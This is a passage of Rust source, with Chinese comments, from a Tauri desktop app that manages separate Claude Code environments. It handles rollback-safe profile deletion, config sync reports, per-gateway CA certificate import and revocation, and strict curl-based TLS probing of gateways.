fn restore_staged_instance(staged: &Option<(PathBuf, PathBuf)>) -> Result<(), String> {
    let Some((root, staged)) = staged else {
        return Ok(());
    };
    if !staged.exists() || root.exists() {
        return Ok(());
    }
    if let Some(parent) = root.parent() {
        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    fs::rename(staged, root).map_err(|e| format!("恢复环境数据失败：{e}"))
}

fn scrub_profile_from_config_artifacts_at(
    dir: &Path,
    primary: &Path,
    backup: &Path,
    name: &str,
    list: &[Profile],
) -> Result<(), String> {
    let clean = serde_json::to_string_pretty(&serde_json::json!({ "profiles": list }))
        .map_err(|e| e.to_string())?;
    // 主配置与恢复备份必须表达相同的删除后状态，不能从备份复活已删除环境。
    fs::write(primary, &clean).map_err(|e| format!("更新主配置失败：{e}"))?;
    fs::write(backup, &clean).map_err(|e| format!("清理配置备份失败：{e}"))?;

    for path in config_artifact_paths_in(dir)? {
        if path == primary || path == backup || !path.is_file() {
            continue;
        }
        let text = fs::read_to_string(&path)
            .map_err(|e| format!("读取配置残留 {} 失败：{e}", path.display()))?;
        match serde_json::from_str::<serde_json::Value>(&text) {
            Ok(mut value) => {
                let Some(profiles) = value
                    .get_mut("profiles")
                    .and_then(|value| value.as_array_mut())
                else {
                    continue;
                };
                let before = profiles.len();
                profiles.retain(|profile| {
                    profile.get("name").and_then(|value| value.as_str()) != Some(name)
                });
                if profiles.len() != before {
                    fs::write(
                        &path,
                        serde_json::to_string_pretty(&value).map_err(|e| e.to_string())?,
                    )
                    .map_err(|e| format!("清理配置残留 {} 失败：{e}", path.display()))?;
                }
            }
            Err(_) if corrupt_config_references_profile(&text, name)? => {
                fs::remove_file(&path)
                    .map_err(|e| format!("删除损坏配置残留 {} 失败：{e}", path.display()))?;
            }
            Err(_) => {}
        }
    }
    Ok(())
}

fn corrupt_config_references_profile(text: &str, name: &str) -> Result<bool, String> {
    let encoded_name = serde_json::to_string(name).map_err(|e| e.to_string())?;
    let compact = text
        .chars()
        .filter(|ch| !ch.is_whitespace())
        .collect::<String>();
    Ok(compact.contains(&format!("\"name\":{encoded_name}")))
}

fn scrub_profile_from_config_artifacts(name: &str, list: &[Profile]) -> Result<(), String> {
    scrub_profile_from_config_artifacts_at(&cfg_dir(), &cfg_path(), &cfg_backup_path(), name, list)
}

fn config_artifacts_reference_profile_at(dir: &Path, name: &str) -> Result<Vec<PathBuf>, String> {
    let mut matches = vec![];
    for path in config_artifact_paths_in(dir)? {
        let text = fs::read_to_string(&path)
            .map_err(|e| format!("核验配置 {} 失败：{e}", path.display()))?;
        let referenced = serde_json::from_str::<serde_json::Value>(&text)
            .ok()
            .and_then(|value| {
                value
                    .get("profiles")
                    .and_then(|value| value.as_array())
                    .cloned()
            })
            .map(|profiles| {
                profiles.iter().any(|profile| {
                    profile.get("name").and_then(|value| value.as_str()) == Some(name)
                })
            })
            .unwrap_or(corrupt_config_references_profile(&text, name)?);
        if referenced {
            matches.push(path);
        }
    }
    Ok(matches)
}

fn config_artifacts_reference_profile(name: &str) -> Result<Vec<PathBuf>, String> {
    config_artifacts_reference_profile_at(&cfg_dir(), name)
}

fn refresh_existing_integration_scripts(list: &[Profile]) -> Result<(), String> {
    if ps_path().is_file() {
        fs::write(ps_path(), generate_ps1(list)).map_err(|e| e.to_string())?;
    }
    if sh_path().is_file() {
        fs::write(sh_path(), generate_sh(list)).map_err(|e| e.to_string())?;
    }
    Ok(())
}

fn integration_scripts_reference_profile(name: &str) -> Result<bool, String> {
    for (path, marker) in [
        (ps_path(), format!("    {} {{", ps_q(name))),
        (sh_path(), format!("    {name})")),
    ] {
        if path.is_file()
            && fs::read_to_string(&path)
                .map_err(|e| format!("核验终端脚本 {} 失败：{e}", path.display()))?
                .contains(&marker)
        {
            return Ok(true);
        }
    }
    Ok(false)
}

#[cfg(target_os = "macos")]
fn deletion_credential_backup(profile: &Profile) -> Result<Option<String>, String> {
    if profile.has_token {
        decrypt_token(profile).map(Some)
    } else {
        Ok(None)
    }
}

#[cfg(not(target_os = "macos"))]
fn deletion_credential_backup(_profile: &Profile) -> Result<Option<String>, String> {
    Ok(None)
}

#[tauri::command]
fn delete_profile(name: String) -> Result<String, String> {
    // **全程**持配置锁，含失败回滚：删除是多步复合事务，
    // 中途被别人插入会留下"删了一半"的状态，回滚也可能覆盖对方的新结果。
    // 锁不可重入，所以下面用 sync::forget_profile_locked 而不是 forget_profile。
    let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试删除")?;
    let _target_guard = mcp::target_write_guard()?;
    let list = load();
    let profile = list
        .iter()
        .find(|profile| profile.name == name)
        .cloned()
        .ok_or("未找到要删除的环境。")?;
    if name == "." || name == ".." || !script_safe_name(&name) {
        return Err("环境名称不安全，拒绝删除。请手动检查配置。".into());
    }
    let credential_backup = deletion_credential_backup(&profile)?;
    let snapshots = capture_deletion_files()?;
    let mcp_cleanup = mcp::environment_cleanup_files(&mcp::McpPaths::system(), &name)?;
    let staged = stage_instance_data(&name)?;
    let mut next = list.clone();
    next.retain(|item| item.name != name);
    let mut credential_cleared = false;
    let mut purge_started = false;

    let deletion = (|| -> Result<(), String> {
        save(&next).map_err(|e| e.to_string())?;
        install_integration(&next)?;
        refresh_existing_integration_scripts(&next)?;
        // 共享配置的分发台账里也要抹掉这个环境：否则将来重建同名环境时，
        // 那条"我们分发过 X"的记录会让 X 被判成"用户改过/删过"，再也收敛不到共享值。
        shared_config::forget_env(&name)?;
        extensions::forget_target_locked(&name)?;
        for (path, remove) in &mcp_cleanup {
            if !path.try_exists().map_err(|e| e.to_string())? {
                continue;
            }
            if *remove {
                fs::remove_file(path).map_err(|e| e.to_string())?;
            } else {
                let mut doc: serde_json::Value =
                    serde_json::from_str(&read_optional_text(path)?).map_err(|e| e.to_string())?;
                mcp::forget_environment_records(&mut doc, &name)?;
                sync::write_json_atomic(path, &doc).map_err(|e| e.to_string())?;
            }
        }
        // 旧版快照已退役，但存量文件里的环境标识也需清理。
        let legacy_snapshot = cfg_dir().join("sync-snapshot.json");
        if legacy_snapshot.is_file() {
            let mut doc: serde_json::Value =
                serde_json::from_str(&read_optional_text(&legacy_snapshot)?)
                    .map_err(|e| format!("旧同步记录损坏，无法核验残留：{e}"))?;
            if let Some(domains) = doc.get_mut("domains").and_then(|v| v.as_object_mut()) {
                for domain in domains.values_mut() {
                    if let Some(replicas) =
                        domain.get_mut("replicas").and_then(|v| v.as_array_mut())
                    {
                        replicas.retain(|v| v.as_str() != Some(name.as_str()));
                    }
                }
            }
            sync::write_json_atomic(&legacy_snapshot, &doc).map_err(|e| e.to_string())?;
        }
        if let Some(path) = ca_bundle_path(&name) {
            match fs::remove_file(path) {
                Ok(()) => {}
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(e) => return Err(format!("删除环境 CA 失败：{e}")),
            }
        }
        scrub_profile_from_config_artifacts(&name, &next)?;
        if profile.has_token {
            clear_token(&name)?;
            credential_cleared = true;
        }
        let residual_configs = config_artifacts_reference_profile(&name)?;
        let ledger_residual = shared_config::ledger_references_env(&name)?;
        let extension_residual = extensions::state_references_target(&name)?;
        let script_residual = integration_scripts_reference_profile(&name)?;
        if !residual_configs.is_empty() || ledger_residual || extension_residual || script_residual
        {
            return Err(format!(
                "删除前核验发现残留：配置 {} 处，终端命令 {}，分发记录 {}",
                residual_configs.len(),
                if script_residual {
                    "存在"
                } else {
                    "已清理"
                },
                if ledger_residual || extension_residual {
                    "存在"
                } else {
                    "已清理"
                }
            ));
        }

        if let Some((_, staged_path)) = &staged {
            purge_started = true;
            purge_instance_root(staged_path)?;
        }
        if staged
            .as_ref()
            .map(|(root, staged_path)| root.exists() || staged_path.exists())
            .unwrap_or(false)
        {
            return Err("删除后核验发现环境数据目录仍然存在".into());
        }
        Ok(())
    })();

    if let Err(error) = deletion {
        let mut rollback_errors = vec![];
        if let Err(rollback) = restore_deletion_files(&snapshots) {
            rollback_errors.push(rollback);
        }
        if let Err(rollback) = restore_staged_instance(&staged) {
            rollback_errors.push(rollback);
        }
        if credential_cleared {
            if let Some(token) = credential_backup.as_deref() {
                if let Err(rollback) = store_token(&name, token) {
                    rollback_errors.push(format!("恢复 Key 失败：{rollback}"));
                }
            }
        }
        return Err(if rollback_errors.is_empty() {
            if purge_started {
                format!("删除数据时失败：{error}。环境配置与剩余文件已恢复，但部分历史数据可能已删除；请检查后重试清理。")
            } else {
                format!("彻底删除未完成，原环境已恢复：{error}")
            }
        } else {
            format!(
                "彻底删除未完成：{error}；回滚异常：{}",
                rollback_errors.join("；")
            )
        });
    }

    Ok("环境配置、凭证、终端命令、同步记录、登录态、项目记录和历史用量数据均已彻底删除。".into())
}

// GUI 启动时调用：刷新集成脚本（exe 路径可能变化）+ 分发扩展与共享 MCP。
#[tauri::command]
/// 组装「同步并修复」的结果汇报：① 做了什么 ② 影响了谁 ③ 哪里没成。
///
/// 抽成纯函数是因为核心不变量是「**warnings 一条都不能丢**」——
/// 原先 `sync_configs` 只返回 summary，警告被丢在 sync.rs 里，
/// 界面只说"写了 N 份"，用户看不到"哪个域被跳过 / 哪次写失败"。
fn compose_sync_report(integration: &str, outcome: &sync::SyncOutcome, names: &[String]) -> String {
    let mut lines = vec![
        integration.to_string(),
        format!("同步结果：{}", outcome.summary),
    ];

    // 影响范围必须与实际分发范围一致。默认 Claude 已在决策 7.2 之后退出这条链，
    // 旧文案（「默认 Claude + N 个环境」）现在是不实陈述。
    let scope = if names.is_empty() {
        "没有受管理环境，本轮无实际改动".to_string()
    } else {
        format!(
            "应用共享库 → {} 个环境（{}）。默认 Claude 不参与，它的配置不会被改写",
            names.len(),
            names.join("、")
        )
    };
    lines.push(format!(
        "影响范围：{scope}；本次只分发应用管理的 mcpServers。插件操作由 Claude Code 官方命令执行。"
    ));

    if outcome.warnings.is_empty() {
        lines.push("无警告。".into());
    } else {
        lines.push(format!("警告 {} 条：", outcome.warnings.len()));
        lines.extend(
            outcome
                .warnings
                .iter()
                .map(|warning| format!("· {warning}")),
        );
    }
    lines.join(
        "
",
    )
}

fn sync_all_blocking() -> Result<String, String> {
    // 启动同步只允许有一个入口。旧实现同时从 setup 后台任务和前端调用这里，
    // 两边会争同一把锁，让首次打开稳定出现一次“配置正在同步”的假失败。
    let result = (|| {
        let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试")?;
        let list = load();
        let names = profile_names(&list);
        let mut msg = install_integration(&list)?; // 内含 Skills / Agents 逐项分发
        let repaired_backups = mcp::repair_backup_permissions(&mcp::McpPaths::system())?;
        if repaired_backups > 0 {
            msg.push_str(&format!(
                "\n已收紧 {repaired_backups} 个旧版 MCP 备份文件的访问权限。"
            ));
        }
        let outcome = sync::sync_configs_locked(&names)?;
        Ok(compose_sync_report(&msg, &outcome, &names))
    })();

    // 旧插件目录迁移也在同一个后台作业里串行执行；每个环境内部仍独立加锁和回退。
    // 即使 MCP / Shell 同步失败，迁移也保留自己的重试机会和日志。
    for note in extensions::migrate_legacy_plugins_blocking() {
        sync::log_line(&format!("插件目录迁移:{note}"));
    }
    match &result {
        Ok(report) => sync::log_line(&format!("GUI 同步并修复:{report}")),
        Err(error) => sync::log_line(&format!("GUI 同步并修复失败:{error}")),
    }
    result
}

#[tauri::command]
async fn sync_all() -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(sync_all_blocking)
        .await
        .map_err(|e| format!("环境同步任务异常：{e}"))?
}

#[tauri::command]
fn environment() -> EnvInfo {
    let platform = if cfg!(target_os = "macos") {
        "macos"
    } else if cfg!(target_os = "windows") {
        "windows"
    } else {
        "other"
    }
    .to_string();
    let platform_ui = platform_ui(&platform);
    let claude_detection = claude_cli::detect_claude();
    EnvInfo {
        platform,
        platform_ui,
        claude_found: claude_detection.found,
        claude_detection,
        integrated: cfg_path().exists(),
        // 范围说明：这是**全部网关环境合计**的张数（去重），不是某一份共享信任库。
        // 界面必须把范围写出来，否则又会读成"所有网关共用一份"。
        cert_imported: count_certs() > 0,
        cert_count: count_certs(),
    }
}

#[tauri::command]
fn set_claude_executable(path: String) -> Result<claude_cli::ClaudeDetection, String> {
    let trimmed = path.trim();
    if trimmed.is_empty() {
        return Err("请选择 Claude 可执行文件。".to_string());
    }
    claude_cli::remember_manual_path(PathBuf::from(trimmed))
}

#[tauri::command]
async fn profile_runtime_info() -> Result<Vec<ProfileRuntimeInfo>, String> {
    tauri::async_runtime::spawn_blocking(profile_runtime_info_blocking)
        .await
        .map_err(|e| format!("环境状态扫描失败：{e}"))
}

fn profile_runtime_info_blocking() -> Vec<ProfileRuntimeInfo> {
    load()
        .into_iter()
        .map(|profile| {
            let config = home()
                .join(".claude-split")
                .join(&profile.name)
                .join(".claude");
            let projects = config.join("projects");
            let last_used = newest_modified(&projects)
                .and_then(|value| value.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|value| value.as_secs());
            let authenticated =
                config.join(".claude.json").is_file() || config.join(".credentials.json").is_file();
            let shared_dirs_ok =
                extensions::problems(std::slice::from_ref(&profile.name)).is_empty();
            ProfileRuntimeInfo {
                name: profile.name,
                config_dir: config.display().to_string(),
                settings_exists: config.join("settings.json").is_file(),
                has_project_data: projects.is_dir(),
                last_used,
                authenticated,
                shared_dirs_ok,
            }
        })
        .collect()
}

#[tauri::command]
fn backup_config() -> Result<String, String> {
    let source = cfg_path();
    if !source.is_file() {
        return Err("当前还没有可备份的环境配置。".into());
    }
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|value| value.as_secs())
        .unwrap_or(0);
    let dir = export_directory();
    let target = dir.join(format!("claude-environment-config-{now}.json"));
    fs::copy(&source, &target).map_err(|e| format!("导出配置备份失败：{e}"))?;
    Ok(target.display().to_string())
}

pub(crate) fn export_directory() -> PathBuf {
    #[cfg(debug_assertions)]
    if std::env::var_os("CC_MANAGER_TEST_HOME").is_some() {
        return home();
    }
    dirs::desktop_dir().unwrap_or_else(cfg_dir)
}

#[tauri::command]
fn recent_sync_log() -> Vec<String> {
    let text = fs::read_to_string(cfg_dir().join("sync.log")).unwrap_or_default();
    let lines = text.lines().map(String::from).collect::<Vec<_>>();
    lines
        .into_iter()
        .rev()
        .take(80)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect()
}

/// 把 PEM 文本切成一张张**原文**证书块（按 BEGIN/END 配对）。
///
/// 返回的是原文片段（保留换行与 `BEGIN CERTIFICATE` 里的空格）——
/// 写回文件时必须用它，重建一份"去空白"的文本会写出非法 PEM。
/// 判等请用 `norm_pem` / `has_block`。
fn pem_blocks(text: &str) -> Vec<String> {
    const BEGIN: &str = "-----BEGIN CERTIFICATE-----";
    const END: &str = "-----END CERTIFICATE-----";
    let mut out = vec![];
    let mut rest = text;
    while let Some(start) = rest.find(BEGIN) {
        let after = &rest[start..];
        let Some(end) = after.find(END) else { break };
        out.push(after[..end + END.len()].trim().to_string());
        rest = &after[end + END.len()..];
    }
    out
}

/// 仅用于**判等**的归一化形式：去掉所有空白。
/// 同一张证书在不同文件里的换行/缩进可能不同，但归一化后必然相同。
fn norm_pem(block: &str) -> String {
    block.chars().filter(|c| !c.is_whitespace()).collect()
}

fn has_block(blocks: &[String], block: &str) -> bool {
    let needle = norm_pem(block);
    blocks.iter().any(|b| norm_pem(b) == needle)
}

/// 某个网关 bundle 里已有的证书块。
fn bundle_blocks(env: &str) -> Vec<String> {
    ca_bundle_path(env)
        .and_then(|p| fs::read_to_string(p).ok())
        .map(|t| pem_blocks(&t))
        .unwrap_or_default()
}

fn read_optional_text(path: &Path) -> Result<String, String> {
    match fs::read_to_string(path) {
        Ok(text) => Ok(text),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(String::new()),
        Err(e) => Err(format!("读取 {} 失败：{e}", path.display())),
    }
}

/// 从这些网关的 bundle 里删掉后，**哪些证书不再被任何网关使用** ⇒ 才允许撤销外部信任。
///
/// 这是本项最容易做错的地方：从网关 A 删掉的证书可能仍被 B 需要，
/// 若无条件撤销，B 会连不上，而用户完全看不出原因（证书还在 B 的文件里，
/// 但系统信任被撤了 —— 只有 curl/Node 会报证书错）。
fn certs_to_revoke(removed: &[String], remaining: &[String]) -> Vec<String> {
    let mut out: Vec<String> = vec![];
    for block in removed {
        if has_block(remaining, block) || has_block(&out, block) {
            continue;
        }
        out.push(block.clone());
    }
    out
}

/// 统计**某个范围**内的证书张数（按 PEM 块）。`None` = 全部网关环境的并集去重。
fn count_certs_for(envs: Option<&[String]>) -> usize {
    let names = envs.map(|e| e.to_vec()).unwrap_or_else(router_env_names);
    let mut seen: Vec<String> = vec![];
    for env in &names {
        for block in bundle_blocks(env) {
            if !seen.contains(&block) {
                seen.push(block);
            }
        }
    }
    seen.len()
}

// 导入 CA 证书：写入**指定网关**的 bundle，并刷新集成脚本。
// 一个文件可放多张 PEM 证书，Node 会全部信任，所以同一个网关的多张 CA 可以共存；
// 但**不同网关之间不再共用**（约束 5）。
fn import_cert_into(envs: &[String], path: &str) -> Result<String, String> {
    let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试")?;
    if envs.is_empty() {
        return Err("没有可导入的网关环境。请先创建至少一个网关环境。".into());
    }
    let src = PathBuf::from(path.trim());
    if !src.exists() {
        return Err("证书文件不存在，请确认路径。".into());
    }
    let new_cert = fs::read_to_string(&src).map_err(|e| format!("读取证书失败：{e}"))?;
    if !new_cert.contains("-----BEGIN CERTIFICATE-----") {
        return Err("文件里没找到 PEM 证书（缺 -----BEGIN CERTIFICATE-----）。".into());
    }
    fs::create_dir_all(ca_dir()).map_err(|e| e.to_string())?;
    let new_blocks = pem_blocks(&new_cert);
    if new_blocks.is_empty() {
        return Err("文件里没找到可用的 PEM 证书块。".into());
    }

    let mut written: Vec<String> = vec![];
    let mut already: Vec<String> = vec![];
    let mut skipped: Vec<String> = vec![];
    for env in envs {
        let Some(dest) = ca_bundle_path(env) else {
            skipped.push(env.clone());
            continue;
        };
        let existing = read_optional_text(&dest)?;
        let have = pem_blocks(&existing);
        // 整个文件里的证书都已在 → 这个网关无需重复导入
        if new_blocks.iter().all(|b| has_block(&have, b)) {
            already.push(env.clone());
            continue;
        }
        let mut text = existing.clone();
        for block in &new_blocks {
            if has_block(&have, block) {
                continue;
            }
            if !text.is_empty() && !text.ends_with('\n') {
                text.push('\n');
            }
            // 写入**原文块**（保留 PEM 的换行与标记里的空格）
            text.push_str(block);
            text.push('\n');
        }
        sync::write_bytes_atomic(&dest, text.as_bytes())
            .map_err(|e| format!("写入 {} 的证书失败：{e}", env))?;
        written.push(env.clone());
    }

    // 重新生成集成脚本。**不能吞错**：脚本刷不出来的话，新终端不会注入 CA，
    // 证书"导入了"却完全不生效 —— 此时报成功就是把用户骗进一个连不上网关的状态。
    let list = load();
    if let Err(e) = install_integration(&list) {
        return Err(format!(
            "证书已写入 {} 个网关环境，但刷新终端集成失败：{e}。请在「环境配置」里点一次「保存并接入终端」重试。",
            written.len()
        ));
    }

    let mut parts = vec![];
    if !written.is_empty() {
        parts.push(format!(
            "已把 {} 张证书导入 {} 个网关环境（{}）",
            new_blocks.len(),
            written.len(),
            written.join("、")
        ));
    }
    if !already.is_empty() {
        parts.push(format!("{} 已有该证书，跳过", already.join("、")));
    }
    if !skipped.is_empty() {
        parts.push(format!(
            "{} 的名称不能安全地作为文件名，已跳过（请改名后重试）",
            skipped.join("、")
        ));
    }
    if parts.is_empty() {
        return Ok("没有需要导入的环境。".into());
    }
    Ok(format!("{}。请重开终端后生效。", parts.join("；")))
}

// 插件启用状态的总览（「扩展 → Plugins」用）：
// 共享库有哪些、每个环境是继承还是覆盖、默认 Claude 是什么（只读展示）。
#[tauri::command]
fn plugins_overview() -> Result<Vec<shared_config::PluginRow>, String> {
    let mut rows = shared_config::plugins_overview()?;
    let exclusions = extensions::plugin_exclusions()?;
    for row in &mut rows {
        for env in &mut row.envs {
            env.excluded = exclusions
                .get(&env.env)
                .is_some_and(|plugins| plugins.contains(&row.name));
        }
    }
    Ok(rows)
}

// 「恢复继承」：撤销该环境对某个插件的独立设置，改回共享值
#[tauri::command]
async fn restore_plugin_inheritance(env: String, name: String) -> Result<String, String> {
    extensions::restore_plugin_inheritance(env, name).await
}

// 「恢复使用共享配置」：撤销某个环境对被分发条目所做的覆盖。
// **必须用户显式触发** —— 分发自己不会替用户改回去。
#[tauri::command]
fn restore_shared_mcp_entry(env: String, name: String) -> Result<String, String> {
    let msg = shared_config::restore_entry(shared_config::FIELD_MCP, &env, &name)?;
    // 恢复后要让脚本/环境立刻反映出来（分发是幂等的，再跑一轮即可）
    let list = load();
    if let Err(e) = install_integration(&list) {
        return Ok(format!("{msg}（注意：刷新终端集成失败：{e}）"));
    }
    Ok(msg)
}

// 导入 CA 到**全部网关环境**（保持旧界面可用；新界面走 import_cert_for 指定目标）
#[tauri::command]
fn import_cert(path: String) -> Result<String, String> {
    import_cert_into(&router_env_names(), &path)
}

// 导入 CA 到**指定的**网关环境（界面按需选择目标）
#[tauri::command]
fn import_cert_for(envs: Vec<String>, path: String) -> Result<String, String> {
    import_cert_into(&envs, &path)
}

/// 全部网关环境的证书张数（去重）。顶栏徽章用。
/// ⚠️ 调用方**必须**把这个数字的范围说清楚（"N 个网关合计"），
/// 只给一个全局数字正是"看起来所有网关共用一份信任库"的误导来源。
fn count_certs() -> usize {
    count_certs_for(None)
}

// 清空**全部网关环境**的 CA（保持旧界面可用；新界面走 clear_certs_for 指定目标）
#[tauri::command]
fn clear_certs() -> Result<String, String> {
    clear_certs_from(&router_env_names())
}

// 清空**指定**网关环境的 CA
#[tauri::command]
fn clear_certs_for(envs: Vec<String>) -> Result<String, String> {
    clear_certs_from(&envs)
}

// 清空**这些网关环境**的 CA 证书。
//
// **撤销范围必须重算**：从网关 A 删掉的证书可能仍被 B 需要。
// 无条件撤销会让 B 连不上，而用户完全看不出原因 —— 所以只撤销
// "删掉的那份里有、且其余网关的并集里已经没有"的证书（见 certs_to_revoke）。
fn clear_certs_from(envs: &[String]) -> Result<String, String> {
    let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试")?;
    // 撤销前严格读取全部 bundle；读不了不能当成“不再被其他环境需要”。
    for env in router_env_names() {
        if let Some(path) = ca_bundle_path(&env) {
            read_optional_text(&path)?;
        }
    }
    // 撤销系统信任与 WorkBuddy 合并 bundle 都要靠这份内容判断"哪些证书是本应用加的"。
    let removed: Vec<String> = envs
        .iter()
        .flat_map(|env| bundle_blocks(env))
        .collect::<Vec<_>>();
    // 其余网关（本次不动它们）当前信任的并集
    let remaining: Vec<String> = router_env_names()
        .into_iter()
        .filter(|n| !envs.contains(n))
        .flat_map(|env| bundle_blocks(&env))
        .collect();
    let to_revoke = certs_to_revoke(&removed, &remaining);

    let mut kept_in_use: Vec<String> = vec![];
    // 仍被别的网关使用的证书：如实说明，不撤销
    for block in &removed {
        if remaining.contains(block) && !kept_in_use.contains(block) {
            kept_in_use.push(block.clone());
        }
    }

    let managed = to_revoke
        .iter()
        .map(|b| format!("{b}\n"))
        .collect::<Vec<_>>()
        .join("");

    // **顺序要紧：先撤销外部信任，全部成功后才删本地信任库。**
    // 原先反过来（先把清单删了再撤销）—— 撤销一旦失败，用户就**没有任何东西可以重试**，
    // 只能靠记忆重新导入一遍。清单是所有撤销动作的唯一依据，不能在依据用完之前毁掉它。
    let revocations = crate::workbuddy::revoke_managed_ca(&managed);
    if revocations.iter().any(|note| note.contains('❌')) {
        let mut lines =
            vec!["CA 撤销未完全成功，本地信任库「已保留」（否则你就没有重试依据了）：".to_string()];
        lines.extend(revocations);
        return Err(lines.join(
            "
",
        ));
    }

    for env in envs {
        if let Some(path) = ca_bundle_path(env) {
            match fs::remove_file(&path) {
                Ok(()) => {}
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(e) => {
                    return Err(format!(
                        "外部信任已撤销，但删除 {env} 的本地证书失败：{e}，请重试"
                    ))
                }
            }
        }
    }
    let _ = union_ca_bundle_path();
    // 清单按已处理的证书缩减（失败不影响本次清理结果，只是留个多余条目）
    let _ = crate::workbuddy::prune_managed_certs(&managed);

    // 集成脚本没刷新的话它还写着证书的路径。CA 注入有 `[ -f ... ]` 兜底，
    // 所以文件已删时那条注入自然不生效、也不会去读一个不存在的文件；
    // 危害确实小于导入侧，但仍要如实报出（脚本还可能缺别的新内容）。
    let list = load();
    let integration = install_integration(&list);

    let mut lines = vec!["已删除本地 CA 信任库并撤销相关信任：".to_string()];
    lines.extend(revocations);
    match &integration {
        Ok(_) => lines.push("终端集成脚本已刷新，请重开终端后生效。".into()),
        Err(e) => {
            lines.push(format!(
                "❌ 刷新终端集成失败：{e}。集成脚本未更新，请在「环境配置」里点一次「保存并接入终端」重试。"
            ));
        }
    }

    let summary = lines.join(
        "
",
    );
    // 任一步失败就报错，让用户看见"并未完全清干净"，而不是收到一句"已清空所有"
    if integration.is_err() {
        return Err(format!(
            "CA 清理未完全成功。
{summary}"
        ));
    }
    Ok(summary)
}

// ---------------- 网关探测：TLS 信任分级 ----------------
//
// 探测必须"严格"——不使用 curl 的 insecure(等价 -k)。两条理由:
//   1) 请求带 Authorization 头,跳过证书校验等于把 API Key 交给任何 on-path 中间人;
//   2) claude(Node)始终校验证书(全仓库无 NODE_TLS_REJECT_UNAUTHORIZED),所以
//      "跳过校验时可达"不能当作网关健康的证据,否则界面绿着而 claude 实际连不上。
//
// 但 curl 的 --cacert 是**替换**信任库而非追加(实测:指定一个无关 CA 后,连公有 CA
// 签发的站点都会以 rc=60 失败),而 Node 的信任集是"系统根证书 ∪ NODE_EXTRA_CA_CERTS"。
// 单次 curl 表达不了这个并集,因此按梯子探测:
//   1) 严格 + 系统信任                —— 覆盖公有 CA、以及 IT 已装进系统库的公司 CA
//   2) 严格 + --cacert 已导入的 bundle —— 覆盖自签网关(本产品设计的正常路径)
// 无条件传 --cacert 会打挂所有公有 CA 网关,所以只在第 1 步以证书类错误失败时才回退。

/// 探测实际走到了哪一级信任
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum TrustMode {
    /// 系统信任库即通过，用户不需要导入任何证书
    System,
    /// 只有带上已导入的 CA bundle 才通过
    ImportedCa,
}

/// curl 退出码的粗分类(数值取自 libcurl 官方错误码表，跨平台一致)
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum CurlFailure {
    /// 握手/证书类：值得带上 --cacert 再试一次
    Tls,
    /// 解析/连接/超时：换信任库也没用
    Network,
    Other,
}

pub(crate) fn classify_curl_failure(code: i32) -> CurlFailure {
    match code {
        // 35 SSL_CONNECT_ERROR / 51 SSL_PEER_CERTIFICATE(60 在 7.62 前的旧值) / 58 SSL_CERTPROBLEM
        // 59 SSL_CIPHER / 60 PEER_FAILED_VERIFICATION / 64 USE_SSL_FAILED
        // 66 SSL_ENGINE_INITFAILED / 77 SSL_CACERT_BADFILE / 80 SSL_SHUTDOWN_FAILED
        // 82 SSL_CRL_BADFILE / 83 SSL_ISSUER_ERROR / 90 SSL_PINNEDPUBKEYNOTMATCH
        // 91 SSL_INVALIDCERTSTATUS / 98 SSL_CLIENTCERT
        35 | 51 | 58 | 59 | 60 | 64 | 66 | 77 | 80 | 82 | 83 | 90 | 91 | 98 => CurlFailure::Tls,
        // 5 COULDNT_RESOLVE_PROXY / 6 COULDNT_RESOLVE_HOST / 7 COULDNT_CONNECT
        // 28 OPERATION_TIMEDOUT
        5 | 6 | 7 | 28 => CurlFailure::Network,
        // 其余一律 Other。**特别说明 52(GOT_NOTHING) / 56(RECV_ERROR) / 55(SEND_ERROR) /
        // 47(TOO_MANY_REDIRECTS)** —— 这一条是**判定过、不是漏掉**：
        //   它们表示"连接被对端掐断 / 重定向过多"，而带 `--cacert` 重试的前提是
        //   "证书链不被信任"（`is_ca_import_likely_helpful` 只认 51/60/77/83）。
        //   中间设备因为无法检视 TLS 而掐断连接时**我们自己这边看不到证书错误**，
        //   拿我们的 CA 重试不会有任何变化。
        //   本机没有证据说明该把它们归入 TLS 类，**所以不猜着改** —— 归错的代价是
        //   给用户一句"请导入 CA"的错误建议，而真正的原因是网络侧。
        _ => CurlFailure::Other,
    }
}

/// 这些退出码的根因确实是"证书链不被信任"，导入 CA 才帮得上忙。
/// 其余 TLS 码（密码套件 59、客户端证书 58/98、引擎 66、吊销相关 80/82/91、
/// 固定公钥 90 等）导入 CA 解决不了，不能给同一句"请导入 CA"，那是误导。
fn is_ca_import_likely_helpful(exit_code: i32) -> bool {
    matches!(exit_code, 51 | 60 | 77 | 83)
}

/// 第 1 步失败后是否回退到"已导入 CA"。只有"证书类失败 + 确实有 bundle"才回退。
fn next_probe_after_failure(kind: CurlFailure, has_bundle: bool) -> Option<TrustMode> {
    (has_bundle && kind == CurlFailure::Tls).then_some(TrustMode::ImportedCa)
}

/// 写进 curl 配置文件的路径统一用正斜杠。
/// curl 的配置文件把 `\` 当转义符(`\t` 会被解释成制表符)，Windows 路径原样写入会被
/// 静默破坏；正斜杠在 Windows 上同样可用，且让两个平台走同一条代码路径(已实测)。
fn curl_path(p: &Path) -> String {
    p.to_string_lossy().replace('\\', "/")
}

/// curl 配置文件的值转义：先剔除控制字符(嵌入换行会跳出引号、注入任意 curl 指令)，
/// 再转义 `\` 和 `"`。
fn curl_escape(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control())
        .collect::<String>()
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
}

/// curl 的 TLS 后端。后端决定 `--cacert` 与吊销检查标志的语义，
/// 不能假定一个平台的行为可以套到另一个平台。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum TlsBackend {
    /// Windows 原生后端，强制查 CRL/OCSP，且 `--cacert` 会替换系统信任库
    Schannel,
